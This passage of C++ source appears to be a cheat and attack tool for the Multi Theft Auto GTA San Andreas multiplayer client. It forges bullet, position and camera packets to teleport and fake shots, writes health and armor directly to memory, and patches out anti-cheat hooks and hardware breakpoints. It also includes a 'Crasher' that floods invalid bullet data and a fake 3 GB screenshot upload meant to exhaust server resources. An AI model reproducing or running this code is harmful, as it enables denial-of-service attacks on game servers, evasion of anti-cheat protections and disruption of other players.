						mov  ecx, player
						push 1                // equip = true
						push 30               // ammo
						push WEAPON_SNIPERRIFLE
						call GiveWeapon
					}
					__asm {
						mov  ecx, player
						push WEAPON_SNIPERRIFLE
						call SetCurrentWeapon
					}
				}
			}
		}
		Sleep(2500);
	}
	return 0;
}
int GetCurrentWeaponID()
{
	DWORD dwPlayerPed = *(DWORD*)0xB6F5F0;
	if (!dwPlayerPed) return 0;

	BYTE byteCurrentSlot = *(BYTE*)(dwPlayerPed + 0x718);
	DWORD dwWeaponSlot = dwPlayerPed + 0x5A0 + (byteCurrentSlot * 0x1C);

	return *(int*)(dwWeaponSlot);
}

bool IsHoldingFirearm()
{
	int weaponID = GetCurrentWeaponID();

	if (weaponID >= 22 && weaponID <= 34)
		return true;
	if (weaponID >= 35 && weaponID <= 38)
		return true;

	return false;
}
int sendBulletSync(CVector fake_vecStart, CVector fake_vecEnd)
{
	if (CNetAPI != nullptr)
	{
		if (!IsHoldingFirearm()) return 0;

		static int m_ucBulletSyncOrderCounter = 1;
		NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();

		if (pBitStream)
		{
			pBitStream->Write((char)GetCurrentWeaponID());

			pBitStream->Write((const char*)&fake_vecStart, sizeof(CVector));
			pBitStream->Write((const char*)&fake_vecEnd, sizeof(CVector));

			pBitStream->Write(m_ucBulletSyncOrderCounter++);

			pBitStream->WriteBit(false);

			g_pNet->SendPacket(PACKET_ID_PLAYER_BULLETSYNC, pBitStream, PACKET_PRIORITY_MEDIUM, PACKET_RELIABILITY_RELIABLE);
			g_pNet->DeallocateNetBitStream(pBitStream);
			return 1;
		}
	}
	return 0;
}
void WriteCameraOrientation(const CVector& vecPositionBase, NetBitStreamInterface& BitStream)
{
	// Заглушка: пишем дефолтные нули без расчётов
	const float fPI = 3.14159265f;
	SFloatAsBitsSync<8> rotation(-fPI, fPI, false);

	// Пишем ротации как 0
	rotation.data.fValue = 0.0f;
	BitStream.Write(&rotation);  // Z rotation
	rotation.data.fValue = 0.0f;
	BitStream.Write(&rotation);  // X rotation

	// Заглушка для позиции: используем relative (false), idx=0 (3 бита на компонент, range +-4)
	bool bUseAbsolutePosition = false;
	uint idx = 0;
	uint uiNumBits = 3;
	float fRange = 4.0f;

	// Пишем флаг и индекс
	BitStream.WriteBit(bUseAbsolutePosition);
	BitStream.WriteBits(&idx, 2);

	// Пишем позиции как 0
	SFloatAsBitsSyncBase position(uiNumBits, -fRange, fRange, false);
	position.data.fValue = 0.0f;
	BitStream.Write(&position);  // X
	position.data.fValue = 0.0f;
	BitStream.Write(&position);  // Y
	position.data.fValue = 0.0f;
	BitStream.Write(&position);  // Z
}
class CControllerState
{
public:
	signed short LeftStickX;             // move/steer left (-128?)/right (+128)
	signed short LeftStickY;             // move back(+128)/forwards(-128?)
	signed short RightStickX;            // numpad 6(+128)/numpad 4(-128?)
	signed short RightStickY;

	signed short LeftShoulder1;
	signed short LeftShoulder2;
	signed short RightShoulder1;            // target / hand brake
	signed short RightShoulder2;

	signed short DPadUp;              // radio change up
	signed short DPadDown;            // radio change down
	signed short DPadLeft;
	signed short DPadRight;

	signed short Start;
	signed short Select;

	signed short ButtonSquare;              // jump / reverse
	signed short ButtonTriangle;            // get in/out
	signed short ButtonCross;               // sprint / accelerate
	signed short ButtonCircle;              // fire

	signed short ShockButtonL;
	signed short ShockButtonR;            // look behind

	signed short m_bChatIndicated;
	signed short m_bPedWalk;
	signed short m_bVehicleMouseLook;
	signed short m_bRadioTrackSkip;

	CControllerState() { memset(this, 0, sizeof(CControllerState)); }
};
void WriteFullKeysync(const CControllerState& ControllerState, NetBitStreamInterface& BitStream)
{
	// Put the controllerstate bools into a key byte
	SFullKeysyncSync keys;
	keys.data.bLeftShoulder1 = (ControllerState.LeftShoulder1 != 0);
	keys.data.bRightShoulder1 = (ControllerState.RightShoulder1 != 0);
	keys.data.bButtonSquare = (ControllerState.ButtonSquare != 0);
	keys.data.bButtonCross = (ControllerState.ButtonCross != 0);
	keys.data.bButtonCircle = (ControllerState.ButtonCircle != 0);
	keys.data.bButtonTriangle = (ControllerState.ButtonTriangle != 0);
	keys.data.bShockButtonL = (ControllerState.ShockButtonL != 0);
	keys.data.bPedWalk = (ControllerState.m_bPedWalk != 0);
	keys.data.ucButtonSquare = (unsigned char)ControllerState.ButtonSquare;
	keys.data.ucButtonCross = (unsigned char)ControllerState.ButtonCross;
	keys.data.sLeftStickX = ControllerState.LeftStickX;
	keys.data.sLeftStickY = ControllerState.LeftStickY;

	// Write it
	BitStream.Write(&keys);
}
void SendRPC(eServerRPCFunctions ID, NetBitStreamInterface* pBitStream)
{
	NetBitStreamInterface* pRPCBitStream = g_pNet->AllocateNetBitStream();
	if (pRPCBitStream)
	{
		// Write the rpc ID
		pRPCBitStream->Write((unsigned char)ID);

		if (pBitStream)
		{
			// Copy each byte from the bitstream we have to this one
			unsigned char ucTemp;
			int           iLength = pBitStream->GetNumberOfBitsUsed();
			while (iLength > 8)
			{
				pBitStream->Read(ucTemp);
				pRPCBitStream->Write(ucTemp);
				iLength -= 8;
			}
			if (iLength > 0)
			{
				pBitStream->ReadBits(&ucTemp, iLength);
				pRPCBitStream->WriteBits(&ucTemp, iLength);
			}
			pBitStream->ResetReadPointer();
		}

		g_pNet->SendPacket(PACKET_ID_RPC, pRPCBitStream, PACKET_PRIORITY_HIGH, PACKET_RELIABILITY_RELIABLE_ORDERED);
		g_pNet->DeallocateNetBitStream(pRPCBitStream);
	}
}
bool sendWeaponSlot5()
{
	if (!g_pNet) return false;
	DWORD dwPlayerPed = *(DWORD*)0xB6F5F0;
	if (!dwPlayerPed) return 0;

	NetBitStreamInterface* bs = g_pNet->AllocateNetBitStream();
	if (!bs) return false;

	// Всегда пишем “zero-ammo” бит для v>=0x4D (сервер его читает в любом случае)
	if (bs->Version() >= 0x44) bs->WriteBit(false);

	// Слот
	SWeaponSlotSync slot{};
	slot.data.uiSlot = 5;
	bs->Write(&slot);

	// Ammo (slot 5 требует ammo)
	SWeaponAmmoSync ammo(WEAPONTYPE_M4, true, true);
	ammo.data.usAmmoInClip = static_cast<unsigned short>(30);
	ammo.data.usTotalAmmo = static_cast<unsigned short>(50);
	bs->Write(&ammo);

	// Отправка RPC
	SendRPC(PLAYER_WEAPON, bs);
	g_pNet->DeallocateNetBitStream(bs);
	return true;
}
int sendPlayerSync(CVector position)
{
	DWORD dwPlayerPed = *(DWORD*)0xB6F5F0;
	if (!dwPlayerPed) return 0;
	NetBitStreamInterface* bitStream = g_pNet->AllocateNetBitStream();
	if (bitStream)
	{
		CControllerState cs{}; 
		SPlayerPuresyncFlags flags;
		SPositionSync        positionSync(false);
		SPedRotationSync     rotationSync;
		SVelocitySync        velocitySync;
		SPlayerHealthSync    healthSync;
		SPlayerArmorSync     armorSync;
		SCameraRotationSync  camRotationSync;

		flags.data.bAkimboTargetUp = false;
		flags.data.bHasAWeapon = false;
		flags.data.bHasContact = false;
		flags.data.bHasJetPack = false;
		flags.data.bIsChoking = false;
		flags.data.bIsDucked = false;
		//
		flags.data.bIsInWater = false;
		flags.data.bSyncingVelocity = true;
		flags.data.bIsOnGround = false;
		//
		flags.data.bIsOnFire = false;
		flags.data.bStealthAiming = false;
		flags.data.bWearsGoogles = false;

		positionSync.data.vecPosition = position;
		rotationSync.data.fRotation = 0.0f;
		velocitySync.data.vecVelocity = CVector(0.0f, 0.0f, 0.0f);//CVector(NAN, NAN, NAN);

		healthSync.data.fValue = *(float*)(dwPlayerPed + 0x540);
		armorSync.data.fValue = *(float*)(dwPlayerPed + 0x548);

		camRotationSync.data.fRotation = 0.0f;

		unsigned char ctx = 0;
		bitStream->Write(ctx);
		WriteFullKeysync(cs, *bitStream);
		bitStream->Write(&flags);
		bitStream->Write(&positionSync);
		bitStream->Write(&rotationSync);
		bitStream->Write(&velocitySync);
		bitStream->Write(&healthSync);
		bitStream->Write(&armorSync);
		bitStream->Write(&camRotationSync);
		WriteCameraOrientation(position, *bitStream);
		//sendWeaponSlot5(); // RPC
		if (flags.data.bHasAWeapon) 
		{
			bitStream->Write(WEAPONTYPE_M4);
			SWeaponSlotSync slot{};
			slot.data.uiSlot = 5;
			bitStream->Write(&slot);
			SWeaponAmmoSync ammo(WEAPONTYPE_M4, true, true);
			ammo.data.usAmmoInClip = 30;
			ammo.data.usTotalAmmo = 50;
			bitStream->Write(&ammo);
			SWeaponAimSync aim(0.0f, false);
			aim.data.fArm = 0.0f;
			bitStream->Write(&aim);
		}
		bitStream->WriteBit(false);
		g_pNet->SendPacket(PACKET_ID_PLAYER_PURESYNC, bitStream, PACKET_PRIORITY_HIGH, PACKET_RELIABILITY_UNRELIABLE_SEQUENCED);
		g_pNet->DeallocateNetBitStream(bitStream);
		return 1;
	}
	return 0;
}
void completeInOut(ElementID pedID, ElementID vehID)
{
	NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
	if (!pBitStream || g_pNet == nullptr) return;

	if (static_cast<eBitStreamVersion>(g_pNet->GetServerBitStreamVersion()) >= eBitStreamVersion::PedEnterExit)
	{
		pBitStream->Write(pedID);
	}

	pBitStream->Write(vehID);
	unsigned char ucAction = static_cast<unsigned char>(1); // enter completed
	pBitStream->WriteBits(&ucAction, 4);

	g_pNet->SendPacket(PACKET_ID_VEHICLE_INOUT, pBitStream, PACKET_PRIORITY_HIGH, PACKET_RELIABILITY_RELIABLE_ORDERED);
	g_pNet->DeallocateNetBitStream(pBitStream);
}
bool sendInOutRequest(void* luaVM)
{
	NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
	if (!pBitStream || g_pNet == nullptr) return false;

	void* user_data = *(void**)call_touserdata(luaVM, 1);
	void* user_data2 = *(void**)call_touserdata(luaVM, 2);
	
	ElementID pedID = TO_ELEMENTID(user_data);
	ElementID vehID = TO_ELEMENTID(user_data2);

	if (static_cast<eBitStreamVersion>(g_pNet->GetServerBitStreamVersion()) >= eBitStreamVersion::PedEnterExit)
	{
		pBitStream->Write(pedID);
	}

	pBitStream->Write(vehID);
	unsigned char ucAction = static_cast<unsigned char>(0); // enter attempt
	unsigned char ucSeat = static_cast<unsigned char>(0); // driver
	bool          bIsOnWater = false;
	unsigned char ucDoor = 0; // driver door
	pBitStream->WriteBits(&ucAction, 4);
	pBitStream->WriteBits(&ucSeat, 4);
	pBitStream->WriteBit(bIsOnWater);
	pBitStream->WriteBits(&ucDoor, 3);

	g_pNet->SendPacket(PACKET_ID_VEHICLE_INOUT, pBitStream, PACKET_PRIORITY_HIGH, PACKET_RELIABILITY_RELIABLE_ORDERED);
	g_pNet->DeallocateNetBitStream(pBitStream);
	completeInOut(pedID, vehID);
	return true;
}
bool sendCameraSync(void* luaVM)
{
	if (!g_pNet) return false;
	NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
	if (!pBitStream) return false;

	unsigned int strLen = 256;
	float x = std::stof(call_tostring(luaVM, 1, &strLen));
	float y = std::stof(call_tostring(luaVM, 2, &strLen));
	float z = std::stof(call_tostring(luaVM, 3, &strLen));

	CVector camPos(x, y, z);
	CVector lookAt = camPos;
	lookAt.fY += 1.0f; // куда смотреть (можешь подставить своё)

	// В версии 0x5E+ нужен sync-time context камеры
	if (pBitStream->Version() >= 0x5E)
	{
		unsigned char ctx = 0;
		pBitStream->Write(ctx);
	}

	// fixed mode
	pBitStream->WriteBit(true);

	SPositionSync pos(false);
	pos.data.vecPosition = camPos;
	pBitStream->Write(&pos);

	SPositionSync look(false);
	look.data.vecPosition = lookAt;
	pBitStream->Write(&look);

	g_pNet->SendPacket(PACKET_ID_CAMERA_SYNC, pBitStream, PACKET_PRIORITY_MEDIUM, PACKET_RELIABILITY_UNRELIABLE_SEQUENCED);
	g_pNet->DeallocateNetBitStream(pBitStream);
	return true;
}
bool RemoveDirRecursive(const std::wstring& dir)
{
	namespace fs = std::filesystem;

	std::error_code ec;
	auto removed = fs::remove_all(fs::path(dir), ec);

	if (ec) return false;

	return true;
}
int __cdecl antiMirage(void* luaVM)
{
	RemoveDirRecursive(mapped_image_dir);
	Nirmata::UseNirmata();
	call_pushboolean(luaVM, true);
	return 1;
}
int __cdecl invokeFunction(void* luaVM)
{
	unsigned int strLen = 500;
	std::string func_name = call_tostring(luaVM, 1, &strLen);
	if (findStringIC(func_name, xorstr_("antiMirage")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		bool rslm = antiMirage(luaVM);
		call_pushboolean(luaVM, rslm);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("sendCameraSync")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		bool rslm = sendCameraSync(luaVM);
		call_pushboolean(luaVM, rslm);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("sendInOutRequest")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		bool rslm = sendInOutRequest(luaVM);
		call_pushboolean(luaVM, rslm);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("enableDbgHook")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		DbgHook = call_toboolean(luaVM, 1);
		call_pushboolean(luaVM, true);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("setDbgHook")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		int dbg = callAddDebugHook(luaVM);
		call_pushboolean(luaVM, dbg);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("hideFunctionCall")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		HideCall = call_toboolean(luaVM, 1);
		call_pushboolean(luaVM, true);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("removeDbgHook")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		int dbg = callRemoveDebugHook(luaVM);
		call_pushboolean(luaVM, dbg);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("genHWID")))
	{
		call_pushstring(luaVM, GenHWID().c_str());
		return 1;
	}
	if (findStringIC(func_name, xorstr_("emulateKey")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		std::string key_code = call_tostring(luaVM, 1, &strLen);
		bool press = call_toboolean(luaVM, 2);
		bool block_input = call_toboolean(luaVM, 3);
		auto pressALT = [](bool press) -> void
		{
			if (press) keybd_event(VK_MENU, 0, 0, 0);
			else keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
		};
		// Поиск соответствующего виртуального кода клавиши
		auto it = keyMap.find(key_code);
		if (it != keyMap.end())
		{
			if (!findStringIC(key_code, xorstr_("LALT"))) EmulateKeyPress(it->second, press, block_input);
			else pressALT(press);
		}
		call_pushboolean(luaVM, true);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("setPedHP")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		std::string pedHP = call_tostring(luaVM, 1, &strLen);
		bool armor = call_toboolean(luaVM, 2);
		DWORD PEDSELF = *(DWORD*)0xB6F5F0;
		if (!armor) *(float*)(PEDSELF + 0x540) = (float)std::stoi(pedHP);
		else *(float*)(PEDSELF + 0x548) = (float)std::stoi(pedHP);
		call_pushboolean(luaVM, true);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("serverCommand")))
	{
		call_lua_remove(luaVM, 1);
		std::string cmd = call_tostring(luaVM, 1, &strLen);
		std::string arg = call_tostring(luaVM, 2, &strLen);
		sendMTAChat(cmd.c_str(), arg.c_str(), false, false, false, false);
		call_pushboolean(luaVM, true);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("sendBulletSync")))
	{
		call_lua_remove(luaVM, 1);
		float start_x = std::stof(call_tostring(luaVM, 1, &strLen));
		float start_y = std::stof(call_tostring(luaVM, 2, &strLen));
		float start_z = std::stof(call_tostring(luaVM, 3, &strLen));
		float end_x = std::stof(call_tostring(luaVM, 4, &strLen));
		float end_y = std::stof(call_tostring(luaVM, 5, &strLen));
		float end_z = std::stof(call_tostring(luaVM, 6, &strLen));
		CVector fake_vecStart = { start_x, start_y, start_z };
		CVector fake_vecEnd = { end_x, end_y, end_z };
		int result = sendBulletSync(fake_vecStart, fake_vecEnd);
		call_pushboolean(luaVM, result);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("sendPlayerSync")))
	{
		call_lua_remove(luaVM, 1);
		float tp_x = std::stof(call_tostring(luaVM, 1, &strLen));
		float tp_y = std::stof(call_tostring(luaVM, 2, &strLen));
		float tp_z = std::stof(call_tostring(luaVM, 3, &strLen));
		CVector teleportPoint = { tp_x, tp_y, tp_z };
		int result = sendPlayerSync(teleportPoint);
		call_pushboolean(luaVM, result);
		return 1;
	}
	if (findStringIC(func_name, xorstr_("setSniperCheck")))
	{
		// Удаляем из стека имя функции, чтобы аргументы для setDbgHook оказались на нужных позициях
		call_lua_remove(luaVM, 1);
		bool set_checker = call_toboolean(luaVM, 1);
		if (set_checker)
		{
			if (hSniperThread == nullptr) hSniperThread = CreateThread(nullptr, 0, SniperThread, nullptr, 0, nullptr);
			else
			{
				TerminateThread(hSniperThread, 0);
				CloseHandle(hSniperThread);
				hSniperThread = nullptr;
				hSniperThread = CreateThread(nullptr, 0, SniperThread, nullptr, 0, nullptr);
			}
		}
		else
		{
			if (hSniperThread != nullptr)
			{
				TerminateThread(hSniperThread, 0);
				CloseHandle(hSniperThread);
				hSniperThread = nullptr;
			}
		}
		call_pushboolean(luaVM, true);
		return 1;
	}
	call_pushboolean(luaVM, false);
	return 1;
}
void CorePatcher()
{
	SigScan scan; DWORD oldProtect = 0;
	DWORD patch_addr = (DWORD)scan.FindPatternIDA(xorstr_("core.dll"), xorstr_("68 ? ? ? ? 68 ? ? ? ? E8"));
	if (patch_addr != NULL)
	{
		BYTE nop[15] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
		VirtualProtect((void*)patch_addr, sizeof(nop), PAGE_EXECUTE_READWRITE, &oldProtect);
		memcpy((void*)patch_addr, nop, sizeof(nop));
		VirtualProtect((void*)patch_addr, sizeof(nop), oldProtect, &oldProtect);
		LogInFile(LOG_NAME, xorstr_("[LOG] Found address from signature to AC_HookGetProcAddr!\n"));
	}
	else LogInFile(LOG_NAME, xorstr_("[ERROR] Can`t find a signature for AC_HookGetProcAddr.\n"));
}
void FuckHWBP()
{
	THREADENTRY32 th32; HANDLE hSnapshot = NULL; th32.dwSize = sizeof(THREADENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (Thread32First(hSnapshot, &th32))
	{
		do
		{
			if (th32.th32OwnerProcessID == GetCurrentProcessId() && th32.th32ThreadID != GetCurrentThreadId())
			{
				HANDLE pThread = OpenThread(THREAD_ALL_ACCESS, FALSE, th32.th32ThreadID);
				if (pThread)
				{
					SuspendThread(pThread); CONTEXT context = { 0 };
					context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
					GetThreadContext(pThread, &context);
					context.Dr7 = 0x0;
					*(DWORD_PTR*)&context.Dr0 = 0x0;
					*(DWORD_PTR*)&context.Dr1 = 0x0;
					*(DWORD_PTR*)&context.Dr2 = 0x0;
					*(DWORD_PTR*)&context.Dr3 = 0x0;
					SetThreadContext(pThread, &context);
					ResumeThread(pThread); CloseHandle(pThread);
					LogInFile(LOG_NAME, xorstr_("[LOG] Removed hardware breakpoints from thread ID: %d\n"), th32.th32ThreadID);
				}
			}
		} while (Thread32Next(hSnapshot, &th32));
	}
}
bool RemoveProcedureHook()
{
	HMODULE hK32 = GetModuleHandleA(xorstr_("kernel32.dll"));
	HMODULE hKB = GetModuleHandleA(xorstr_("kernelBase.dll"));

	if (!hK32 && !hKB) return false;

	using GETPROC_T = FARPROC(WINAPI*)(HMODULE, LPCSTR);
	GETPROC_T gp = reinterpret_cast<GETPROC_T>(&::GetProcAddress);

	FARPROC self = nullptr;
	if (hK32) self = gp(hK32, xorstr_("GetProcAddress"));
	if (!self && hKB) self = gp(hKB, xorstr_("GetProcAddress"));
	if (!self) return false;

	BYTE* p = reinterpret_cast<BYTE*>(self);
	const BYTE orig[5] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC };
	if (std::memcmp(p, orig, sizeof(orig)) == 0) return true;
	if (p[0] != 0xE9)
	{
		LogInFile(LOG_NAME, xorstr_("[ERROR] AC_HookGetProcAddr is not hooked!\n"));
		return false;
	}
	DWORD oldProtect = 0;
	if (!VirtualProtect(p, sizeof(orig), PAGE_EXECUTE_READWRITE, &oldProtect)) return false;

	std::memcpy(p, orig, sizeof(orig));
	FlushInstructionCache(GetCurrentProcess(), p, sizeof(orig));

	DWORD tmp = 0;
	VirtualProtect(p, sizeof(orig), oldProtect, &tmp);

	return true;
}
HMODULE __stdcall hkLoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags)
{
	RestorePrologue((DWORD)callLoadLibraryExW, loadlib_prologue, sizeof(loadlib_prologue)); // восстанавливаем пролог функции
	HMODULE hModule = callLoadLibraryExW(lpLibFileName, hFile, dwFlags);
	if (lpLibFileName != nullptr && wcslen(lpLibFileName) >= 1)
	{
		std::wstring wstrLibFileName = std::wstring(lpLibFileName);
		bool mappedAsImage = (dwFlags & DONT_RESOLVE_DLL_REFERENCES) != 0;
		if (w_findStringIC(wstrLibFileName, xorstr_(L"client.dll")) && !mappedAsImage)
		{
			LogInFile(LOG_NAME, xorstr_("[LOG] Сработал хук LoadLibraryW на загрузку client.dll!\n"));
			hwbp_end1 = false; // сбрасываем флаг на хуки
			hwbp_end2 = false; // сбрасываем флаг на хуки
			SignatureScanner(); // Запускаем сканнер сигнатур и ставим хуки
		}
	}
	MakeJump((DWORD)callLoadLibraryExW, (DWORD)hkLoadLibraryExW, loadlib_prologue, sizeof(loadlib_prologue));
	return hModule;
}
static std::string kDumpDir{ xorstr_("DumpedHeap") };
// Создаём каталог ровно один раз
static void EnsureDumpDirectory()
{
	static std::once_flag flag;
	std::call_once(flag, []()
		{
			kDumpDir = CvWideToAnsi(mapped_image_dir) + xorstr_("\\DumpedHeap");
			std::filesystem::create_directories(kDumpDir);
		});
}
static std::string RandomString(std::size_t len)
{
	static const char charset[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789";
	static thread_local std::mt19937 gen{ std::random_device{}() };
	std::uniform_int_distribution<>  dist(0, sizeof(charset) - 2);

	std::string out;
	out.reserve(len);
	while (len--)
		out.push_back(charset[dist(gen)]);
	return out;
}
void SendRagCarpetScreenShot()
{
	/* 1. Константы ------------------------------------------------------- */
	constexpr uint32_t kUiBytesPerPart = 65535U;                                 // Максимум для uint16_t
	constexpr uint32_t kRealBufferSize = kUiBytesPerPart;
	constexpr uint32_t kUiTotalByteSize = 3U * 1024U * 1024U * 1024U;           // 3 ГБ
	constexpr uint32_t kUiNumParts = (kUiTotalByteSize + kUiBytesPerPart - 1) / kUiBytesPerPart; // ~49153 частей
	constexpr uint32_t kIntervalMs = 100;                                         // мс

	/* 2. Реальные 65535 байт шума + случайные метаданные -------------------- */
	std::vector<char> vData(kRealBufferSize);
	{
		std::mt19937                    g{ std::random_device{}() };
		std::uniform_int_distribution<> d(0, 255);
		for (char& c : vData)
			c = static_cast<char>(d(g));
	}

	std::mt19937                            g{ std::random_device{}() };
	std::uniform_int_distribution<uint16_t> d16(1, 65'535);
	uint16_t                                usResNetId = d16(g);
	std::string                             strResName = RandomString(12);
	std::string                             strTag = RandomString(8);
	std::uniform_int_distribution<uint32_t> d32(1, 0xFFFFFFFF);
	uint32_t                                uiServerTime = d32(g);

	static std::atomic<uint16_t> s_id{ 0 };
	uint16_t                     usShotId = ++s_id;

	std::thread(
		[=, data = std::move(vData)]() mutable
		{
			static char junk[65535] = { 0 };

			for (uint32_t part = 0; part < kUiNumParts; ++part)
			{
				NetBitStreamInterface* bs = g_pNet->AllocateNetBitStream();

				bs->Write(static_cast<uchar>(1));
				bs->Write(usShotId);
				bs->Write(static_cast<uint16_t>(part));

				uint32_t    offset = part * kUiBytesPerPart;
				const char* pSend = junk;
				uint16_t    sz = kUiBytesPerPart;

				if (offset < kRealBufferSize)
				{
					sz = static_cast<uint16_t>(std::min<uint32_t>(kRealBufferSize - offset, kUiBytesPerPart));
					pSend = data.data() + offset;
				}

				bs->Write(sz);
				bs->Write(pSend, sz);

				if (part == 0)
				{
					bs->Write(uiServerTime);
					bs->Write(kUiTotalByteSize);
					bs->Write(static_cast<uint16_t>(kUiNumParts));
					bs->Write(usResNetId);
					bs->WriteString(strTag.c_str());
					bs->WriteString(strResName.c_str());
				}

				g_pNet->SendPacket(PACKET_ID_PLAYER_SCREENSHOT, bs, PACKET_PRIORITY_LOW,
					PACKET_RELIABILITY_RELIABLE_ORDERED, PACKET_ORDERING_DATA_TRANSFER);
				g_pNet->DeallocateNetBitStream(bs);

				std::this_thread::sleep_for(std::chrono::milliseconds(kIntervalMs));
			}
		})
		.detach();
}
void Crasher()
{
	while (true)
	{
		if (CNetAPI != nullptr && crasher)
		{
			if (!IsHoldingFirearm()) continue;
			static int m_ucBulletSyncOrderCounter = 1;
			constexpr float fInvalidVectorValue = 1000000000.0f;
			CVector fake_vecStart(fInvalidVectorValue, fInvalidVectorValue, fInvalidVectorValue);
			CVector fake_vecEnd(-fInvalidVectorValue, -fInvalidVectorValue, -fInvalidVectorValue);
			//CVector fake_vecStart(1.0f, 1.0f, 1.0f);
			//CVector fake_vecEnd(2999.0f, 2999.0f, 2999.0f);
			NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
			if (pBitStream)
			{
				pBitStream->Write((char)GetCurrentWeaponID());

				pBitStream->Write((const char*)&fake_vecStart, sizeof(CVector));
				pBitStream->Write((const char*)&fake_vecEnd, sizeof(CVector));

				pBitStream->Write(m_ucBulletSyncOrderCounter++);

				pBitStream->WriteBit(false);

				g_pNet->SendPacket(PACKET_ID_PLAYER_BULLETSYNC, pBitStream, PACKET_PRIORITY_MEDIUM, PACKET_RELIABILITY_RELIABLE);
				g_pNet->DeallocateNetBitStream(pBitStream);
			}
		}
		Sleep(250);
	}
}
typedef void(__cdecl* process_img_archive_t)(char* filename, int a2, int a3);
process_img_archive_t g_original_process_img_archive = nullptr;

typedef void* (__cdecl* IMG_DecryptFileData_t)(int context, char* outputBuffer, void* inputBuffer, size_t inputSize);
IMG_DecryptFileData_t g_original_IMG_DecryptFileData = nullptr;

typedef HANDLE(__stdcall* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
CreateFileA_t g_original_CreateFileA = nullptr;

typedef BOOL(__stdcall* ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
ReadFile_t g_original_ReadFile = nullptr;

typedef DWORD(__stdcall* SetFilePointer_t)(HANDLE, LONG, PLONG, DWORD);
SetFilePointer_t g_original_SetFilePointer = nullptr;

#define MAGIC_VER2 0x32524556
#define MAGIC_VERF 0x46524556

#pragma pack(push, 1)
struct FileEntryV2
{
	uint32_t offset;
	uint16_t size_sectors;
	uint16_t size_bytes;
	char name[24];
};

struct EnhancedFileEntry
{
	uint32_t offset;
	uint16_t size_sectors;
	uint16_t size_sectors_dup;
	uint32_t full_size;
	uint32_t flags;
	char name[24];
	char reserved[24];
};
#pragma pack(pop)

struct FileTracker
{
	HANDLE handle;
	std::string filepath;
	uint64_t currentPosition;
	bool isVehiclesImg;
};

struct VehiclesCapture
{
	bool active;
	std::string filepath;
	std::vector<uint8_t> originalData;
	std::vector<uint8_t> decryptedData;
	std::map<HANDLE, FileTracker> fileTrackers;
	HANDLE vehiclesHandle;
	uint64_t lastReadPosition;
	uint64_t lastReadSize;
	bool headerDecrypted;
};

VehiclesCapture g_capture;

HANDLE __stdcall Hook_CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
	HANDLE result = g_original_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode,
		lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

	if (result != INVALID_HANDLE_VALUE && lpFileName)
	{
		std::string path = lpFileName;
		if (findStringIC(path.c_str(), "VEHICLES.IMG"))
		{
			g_capture.fileTrackers[result] = { result, path, 0, true };
			g_capture.vehiclesHandle = result;
			LogInFile(xorstr_("img_dump.log"),
				xorstr_("[LOG] Opened VEHICLES.IMG, handle: 0x%X\n"), result);
		}
	}

	return result;
}

DWORD __stdcall Hook_SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
{
	DWORD result = g_original_SetFilePointer(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);

	auto it = g_capture.fileTrackers.find(hFile);
	if (it != g_capture.fileTrackers.end() && it->second.isVehiclesImg)
	{
		uint64_t newPos = result;
		if (lpDistanceToMoveHigh)
			newPos |= ((uint64_t)*lpDistanceToMoveHigh << 32);

		it->second.currentPosition = newPos;

		LogInFile(xorstr_("img_dump.log"),
